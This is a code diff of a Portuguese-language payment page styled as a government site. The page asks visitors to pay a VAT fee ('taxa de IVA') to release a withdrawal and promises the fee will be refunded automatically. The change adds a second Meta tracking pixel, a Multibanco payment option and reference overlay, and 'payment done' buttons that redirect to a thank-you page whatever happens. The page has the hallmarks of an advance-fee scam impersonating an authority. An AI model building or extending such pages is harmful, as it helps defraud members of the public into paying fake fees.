@@ -35,13 +35,13 @@
      t.src=v;s=b.getElementsByTagName(e)[0]; 
      s.parentNode.insertBefore(t,s)}(window, document,'script', 
      'https://connect.facebook.net/en_US/fbevents.js'); 
-     fbq('init', '1988037148802788'); 
-     fbq('init', '1988037148802788'); 
-     fbq('track', 'PageView'); 
-     </script> 
+     fbq('init', '1988037148802788');
+     fbq('init', '1512612873613159');
+     fbq('track', 'PageView');
+     </script>
      <noscript>
      <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1988037148802788&ev=PageView&noscript=1"/>
-     <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1988037148802788&ev=PageView&noscript=1"/>
+     <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1512612873613159&ev=PageView&noscript=1"/>
      </noscript> 
      <!-- End Meta Pixel Code -->
 
@@ -261,15 +261,24 @@
                 <p style="margin:0; font-size: 0.85rem;">Após a <strong>confirmação do pagamento</strong>, o valor do IVA será <strong>automaticamente restabelecido</strong> e integrado na própria <span style="color:var(--gov-blue); text-decoration:underline;">transação de levantamento</span>, garantindo que não há qualquer prejuízo final ao utilizador.</p>
             </div>
 
-            <div class="payment-option">
-                <input type="checkbox" checked="" disabled="" style="accent-color: var(--gov-blue);">
-                <img src="images/mbway.svg" alt="MB WAY" height="20">
-                <span>Mbway</span>
+            <div style="display:flex; gap:10px; margin-bottom:12px;">
+                <label class="payment-option" style="flex:1; cursor:pointer; border:2px solid var(--gov-blue); border-radius:6px; padding:10px; text-align:center; transition:all 0.2s;" id="opt-mbway" onclick="selectPayment('mbway')">
+                    <input type="radio" name="upsell-method" value="mbway" checked style="display:none;">
+                    <img src="images/mbway.svg" alt="MB WAY" height="20"><br>
+                    <span style="font-size:0.85rem; font-weight:600;">MB WAY</span>
+                </label>
+                <label class="payment-option" style="flex:1; cursor:pointer; border:2px solid #ddd; border-radius:6px; padding:10px; text-align:center; transition:all 0.2s;" id="opt-multibanco" onclick="selectPayment('multibanco')">
+                    <input type="radio" name="upsell-method" value="multibanco" style="display:none;">
+                    <img src="images/multibanco.svg" alt="Multibanco" height="20"><br>
+                    <span style="font-size:0.85rem; font-weight:600;">Multibanco</span>
+                </label>
             </div>
 
-            <div class="phone-input-group" style="position:relative;">
-                <input type="tel" id="upsell-phone" placeholder="Insira seu número de telemóvel" maxlength="15" value="+351 " style="padding-right: 40px;">
-                <span style="position:absolute; right:10px; font-size: 1.2rem;">🇵🇹</span>
+            <div id="phone-section">
+                <div class="phone-input-group" style="position:relative;">
+                    <input type="tel" id="upsell-phone" placeholder="Insira seu número de telemóvel" maxlength="15" value="+351 " style="padding-right: 40px;">
+                    <span style="position:absolute; right:10px; font-size: 1.2rem;">🇵🇹</span>
+                </div>
             </div>
 
             <button id="btn-retirar" class="btn-ajudar" style="margin-top: 0;">PAGAR TAXA E CONCLUIR</button>
@@ -283,12 +292,58 @@
     <script src="js/config.js"></script> <!-- Configurações de API -->
     <script src="js/upsell.js"></script>
 
-    <!-- Loading Overlay -->
+    <!-- Loading Overlay (MB WAY) -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
         <div class="loading-title">A aguardar confirmação...</div>
         <div class="loading-text">Por favor, aceda à aplicação MB WAY no seu telemóvel e autorize o pagamento da taxa de IVA.<br><br>Não feche esta página enquanto aguarda.</div>
         <button id="btn-confirmar-pagamento" onclick="window.location.href='obrigado.html'" style="display:none; margin-top:24px; background-color:#0059b3; color:white; border:none; padding:14px 32px; border-radius:4px; font-weight:600; font-size:1rem; cursor:pointer;">JÁ CONFIRMEI O PAGAMENTO</button>
     </div>
+
+    <!-- Multibanco Overlay -->
+    <div id="multibanco-overlay" class="loading-overlay" style="display:none;">
+        <div style="background:#fff; border-radius:12px; padding:30px; max-width:340px; width:90%; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.15);">
+            <img src="images/multibanco.svg" alt="Multibanco" height="30" style="margin-bottom:16px;">
+            <h3 style="margin:0 0 6px; font-size:1.1rem; color:#333;">Referência Multibanco</h3>
+            <p style="margin:0 0 20px; font-size:0.85rem; color:#666;">Efetue o pagamento numa caixa ATM ou homebanking</p>
+            <div style="background:#f8f8f8; border-radius:8px; padding:16px; text-align:left; margin-bottom:20px;">
+                <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #eee;">
+                    <span style="color:#666; font-size:0.9rem;">Entidade</span>
+                    <strong id="mb-entity" style="font-size:0.95rem;">---</strong>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #eee;">
+                    <span style="color:#666; font-size:0.9rem;">Referência</span>
+                    <strong id="mb-reference" style="font-size:0.95rem;">---</strong>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding:8px 0;">
+                    <span style="color:#666; font-size:0.9rem;">Valor</span>
+                    <strong id="mb-value" style="font-size:0.95rem; color:var(--gov-blue);">---</strong>
+                </div>
+            </div>
+            <div id="mb-status" style="font-size:0.85rem; color:#666; margin-bottom:16px;">A aguardar pagamento...</div>
+            <button onclick="window.location.href='obrigado.html'" style="background:#0059b3; color:white; border:none; padding:12px 28px; border-radius:6px; font-weight:600; font-size:0.95rem; cursor:pointer; width:100%;">JÁ EFETUEI O PAGAMENTO</button>
+        </div>
+    </div>
+
+    <script>
+    // Seleção de método de pagamento
+    let selectedMethod = 'mbway';
+    function selectPayment(method) {
+        selectedMethod = method;
+        const optMbway = document.getElementById('opt-mbway');
+        const optMb = document.getElementById('opt-multibanco');
+        const phoneSection = document.getElementById('phone-section');
+
+        if (method === 'mbway') {
+            optMbway.style.borderColor = 'var(--gov-blue)';
+            optMb.style.borderColor = '#ddd';
+            phoneSection.style.display = 'block';
+        } else {
+            optMb.style.borderColor = 'var(--gov-blue)';
+            optMbway.style.borderColor = '#ddd';
+            phoneSection.style.display = 'none';
+        }
+    }
+    </script>
 </body>
 </html>
